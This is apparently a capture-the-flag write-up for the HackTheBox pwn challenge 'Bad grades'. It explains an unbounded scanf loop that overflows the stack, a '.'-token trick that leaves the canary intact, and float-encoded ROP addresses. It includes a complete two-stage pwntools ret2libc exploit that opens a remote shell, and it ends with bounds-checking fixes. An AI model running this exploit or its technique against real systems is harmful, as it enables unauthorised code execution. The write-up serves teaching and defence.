---
title: "Bad grades"
date: 2027-04-22 09:00:00 -0500
categories: [HackTheBox, Challenges, Pwn]
tags: [hackthebox, challenge, pwn, buffer-overflow, ret2libc, rop, stack-canary, scanf, pwntools]
description: "An Easy Pwn challenge where a grade tracker reads an unbounded signed count and then that many doubles with scanf(\"%lf\") into a fixed stack array. The loop count alone overruns the stack canary and saved return address; two scanf quirks — a non-numeric token that leaves a slot untouched, and IEEE-754 float-encoded gadget addresses — defeat the canary with no leak and turn the overflow into a ret2libc shell."
---

## Overview

**Bad grades** is an Easy Pwn challenge: a grade-average tool that lets you "add new" grades. It reads a **signed** count with `scanf("%d")` and never checks its range, then reads that many `double`s with `scanf("%lf")` into a fixed 264-byte stack array. The binary is fully mitigated — stack canary, NX, Full RELRO, No-PIE — yet the unbounded loop count is a textbook [stack buffer overflow](https://cwe.mitre.org/data/definitions/121.html), and two small `scanf` tricks carry it all the way to a `system("/bin/sh")` shell.

## The technique

Two facts about `scanf("%lf")` make this work without ever leaking the canary:

1. **A non-numeric token preserves the slot.** Feeding `scanf("%lf")` a lone `.` is a *matching failure*: it returns 0, leaves the destination `double` **unchanged**, and — crucially — still advances to the next field instead of getting stuck. So we send `.` for the padding slots **and the canary/saved-rbp slots**: the canary bytes survive untouched while we keep writing past them.

2. **`%lf` can write any 8 bytes.** A `double` is 8 bytes, so if we send the decimal/hex-float whose IEEE-754 encoding equals a target address, `scanf("%lf")` writes that address verbatim. Python's `float.hex()` emits the exact C99 hex-float that `scanf` parses back to the same bits.

With No-PIE the binary gadgets sit at fixed addresses, so the overflow becomes a clean two-stage ROP: leak libc, then ret2libc.

## Solution

The vulnerable routine (`add_new`) decompiles to roughly:

```c
int count; double grades[33], sum = 0;   // grades[] at rbp-0x110, canary at rbp-0x8
scanf("%d", &count);                      // signed, NO bounds check
for (int i = 0; i < count; i++)
    scanf("%lf", &grades[i]);             // i can exceed 33 -> overruns canary + saved RIP
```

Grade index **33** lands on the canary, **34** on saved `rbp`, **35** on the saved return address, **36+** is the ROP chain. The `.`-preserves-the-slot behaviour is easy to confirm live — sending `5 1 2 . 4 5` reports an average of `2.40 = (1+2+0+4+5)/5`, proving slot 3 stayed `0` while 4 and 5 still read.

The full exploit, runnable verbatim against the live instance:

```python
#!/usr/bin/env python3
import struct, sys
from pwn import *

context.arch = 'amd64'
libc = ELF('./libc.so.6')

POP_RDI  = 0x401263   # pop rdi ; ret
RET      = 0x400666   # ret  (16-byte stack alignment before system)
PUTS_PLT = 0x400680
PUTS_GOT = 0x601fa8
MAIN     = 0x401108

def fl(qword):
    "qword -> string scanf('%lf') parses to the exact 8 bytes"
    return struct.unpack('<d', p64(qword))[0].hex()

PAD = 35   # '.' slots covering buffer -> canary -> saved rbp

def add_grades(io, chain):
    grades = ['.'] * PAD + [fl(x) for x in chain]
    io.sendlineafter(b'> ', b'2')
    io.sendlineafter(b'grades: ', str(len(grades)).encode())
    for g in grades:
        io.sendlineafter(b']: ', g.encode())

io = remote(sys.argv[1], int(sys.argv[2]))

# stage 1: leak puts@GOT, return to main for a second overflow
add_grades(io, [POP_RDI, PUTS_GOT, PUTS_PLT, MAIN])
io.recvuntil(b'is: '); io.recvline()
libc.address = u64(io.recvline().strip().ljust(8, b'\x00')) - libc.sym['puts']
log.success(f'libc base = {hex(libc.address)}')

# stage 2: system("/bin/sh")
add_grades(io, [RET, POP_RDI, next(libc.search(b'/bin/sh')), libc.sym['system']])
io.recvuntil(b'is: '); io.recvline()
io.sendline(b'cat flag*')
io.interactive()
```

Running it pops a shell and prints the flag:

```text
$ python3 solve.py <target-ip> <port>
[+] libc base = 0x7f76904a1000
HTB{...}
```

## Why it worked

The root cause is an **unchecked, attacker-controlled loop count** ([CWE-606](https://cwe.mitre.org/data/definitions/606.html)). The count is read as a *signed* `int` with no upper bound, so the read loop walks straight off the end of the fixed array — past the canary and the saved return address. Every modern mitigation is present (canary, NX, RELRO, PIE-less only by design) but none of them matter once the loop length itself is the bug: the `.`-token trick replays the canary's own bytes back over itself, and the float encoding turns a benign "enter your grades" prompt into an arbitrary-address writer. The flag name says it outright — the canary *is afraid of signed numbers*.

## Fix / defense

- **Bound the count against the buffer capacity before looping:** `if (scanf("%d", &n) != 1 || n < 0 || n > MAX) abort();`. Never loop on an attacker-supplied length into a fixed buffer.
- Use an unsigned type and reject negative/oversized values.
- Check `scanf`'s return value — a matching failure must abort or re-prompt, never silently continue.
- Mitigations (`-fstack-protector-strong`, PIE/ASLR, Full RELRO) are valuable but do **not** substitute for a bounds check on the loop.
